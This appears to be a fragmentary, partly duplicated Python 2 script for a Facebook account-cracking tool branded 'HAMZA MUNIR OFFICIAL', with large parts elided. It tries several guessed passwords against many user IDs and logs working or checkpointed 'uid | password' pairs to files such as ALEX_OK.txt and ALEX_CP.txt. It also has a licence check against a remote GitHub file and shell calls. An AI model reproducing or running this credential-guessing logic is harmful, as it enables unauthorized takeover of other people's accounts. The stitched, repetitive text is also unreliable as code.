...
os.system('git pull')
os.system('clear')
logo = '\n\x1b[1;92m    SARIF CHORA ALEX OFFICIAL       .SSS\n\x1b[1;92m   HAMZA MUNIR OFFICIAL \n\x1b[1;91m   HAMZA MUNIR OFFICIAL \n\x1b[1;91m   HAMZA MUNIR OFFICIAL \n\x1b[1;97m   HAMZA MUNIR OFFICIAL \xe2\x80\xa2AHAD XE ASAD\n\x1b[1;97m   HAMZA MUNIR OFFICIAL\n\x1b[1;94m   HAMZA MUNIR OFFICIAL \n\x1b[1;94m   HAMZA MUNIR OFFICIAL \n\x1b[1;93m   HAMZA MUNIR OFFICIAL\n\x1b[1;96mHAMZA MUNIR OFFICIAL \n\x1b[1;96m   HAMZA MUNIR OFFICIAL\n\x1b[1;96m        \n\x1b[1;91m-----------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : HAMZA MUNIR OFFICIAL\n\x1b[1;97m\xe2\x9e\xa3 Github : https://github.com/Hamzamunirjmk\n\x1b[1;97m\xe2\x9e\xa3 WP NO: +923106930238\n\x1b[1;91m-----------------------------------------------'
...
os.system('git pull')
os.system('clear')
logo = '\n\x1b[1;92mSARIF CHORA ALEX OFFICIAL\n\x1b[1;92mSARIF CHORA ALEX OFFICIAL\n\x1b[1;91mHAMZA MUNIR OFFICIAL\n\x1b[1;91mHAMZA MUNIR OFFICIAL\n\x1b[1;97mHAMZA MUNIR OFFICIAL\xe2\x80\xa2YOUTUBE KING\n\x1b[1;97mHAMZA MUNIR OFFICIAL\n\x1b[1;94mHAMZA MUNIR OFFICIAL\n\x1b[1;94mHAMZA MUNIR OFFICIAL\n\x1b[1;93mHAMZA MUNIR OFFICIAL\n\x1b[1;96mHAMZA MUNIR OFFICIAL\n\x1b[1;96m   HAMZA MUNIR OFFICIAL\n\x1b[1;96m        \n\x1b[1;91m-----------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : HAMZA MUNIR OFFICIAL\n\x1b[1;97m\xe2\x9e\xa3 Github : https://github.com/Hamzamunirjmk\n\x1b[1;97m\xe2\x9e\xa3 WP NO: +923106930238\n\x1b[1;91m-----------------------------------------------'
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/Hamzajmkofficial/Alexhittler/main/server.txt').text
    if to in r:
        ...
        os.system('xdg-open https://wa.me/+923106930238')
        reg()
...
def menu():
    ...
    print '\x1b[1;92m[6] Youtube ALeX RaJpuT'
    menu_s()
...
def a_s():
    ...
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~ Alex public cracking ~~~~\x1b[1;91m'
        print 47 * '-'
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mSARIF CHORA ALEX OFFICIAL Kings Of Facebook\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[ALEX-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[ALEX-CP] ' + uid + ' | ' + pass1
                cp = open('ALEX_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[ALEX-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/ALEX_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[ALEX-CP] ' + uid + ' | ' + pass2
                    cp = open('ALEX_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[ALEX-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/ALEX_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[OHH-CP] ' + uid + ' | ' + pass3
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[ALEX-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/ALEX_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[ALEX-CP] ' + uid + ' | ' + pass4
                            cp = open('ALEX_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
...
def c_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mSARIF CHORA ALEX OFFICIAL Kings Of Fcebook\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                print '\x1b[1;31;1m[OHH-CP] ' + uid + ' | ' + pass1
                cp = open('ALEX_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
...
if __name__ == '__main__':
    ...
    r = requests.get('https://raw.githubusercontent.com/Alexhittlerofficial/Alexhittler/main/server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
...
def menu():
    ...
    print '\x1b[1;92m[4] View token'
    print '\x1b[1;92m[5] Logout'
    print '\x1b[1;92m[6] Youtube ALeX RaJpuT Official'
    menu_s()
            ...
            if 'loc' in q:
                ...
                if 'loc' in q:
                    ...
                    if 'loc' in q:
                        ...
                        print '\x1b[1;31;1m[ALEX-CP] ' + uid + ' | ' + pass3
                        cp = open('ALEX_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
